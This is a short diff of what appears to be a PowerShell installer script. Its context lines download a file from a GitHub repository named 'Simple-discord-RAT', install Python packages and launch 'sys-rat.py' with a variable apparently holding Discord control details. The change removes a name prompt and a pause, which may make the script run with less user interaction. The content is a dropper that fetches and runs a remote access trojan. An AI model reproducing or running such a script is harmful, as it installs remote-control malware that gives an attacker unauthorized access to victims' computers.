@@ -11,6 +11,3 @@ iwr -Uri https://raw.githubusercontent.com/simen64/Simple-discord-RAT/main/Simpl
 py -m pip install discord.py requests --user
 
 Python sys-rat.py $dc
-
-$name= Read-Host -Prompt "Enter your name"
-pause
